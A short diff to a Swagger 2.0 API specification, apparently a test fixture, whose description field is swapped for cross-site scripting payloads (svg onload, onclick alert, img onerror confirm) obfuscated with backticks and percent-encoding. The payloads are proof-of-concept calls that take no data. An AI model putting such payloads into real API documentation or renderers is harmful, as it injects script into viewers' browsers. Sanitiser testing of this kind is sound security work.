@@ -1,7 +1,7 @@
 swagger: '2.0'
 info:
   title: Classic API Resource Documentation
-  description: <form><math>'>"<svg onload="document.write('test')"><h1 onclick="prompt('XSS')">BU0</h1></math></form><img/src="x" on%65rror=confirm(1)>
+  description: <form><math>'>"<svg/x-onloa`d`="document.write('test')"><h1 oncli`c`k="al%65rt('XSS')">BU0</h1></math></form><img/src="x" on%65rror="confirm`1`">
 
   version: production
 basePath: /test-c4sper0
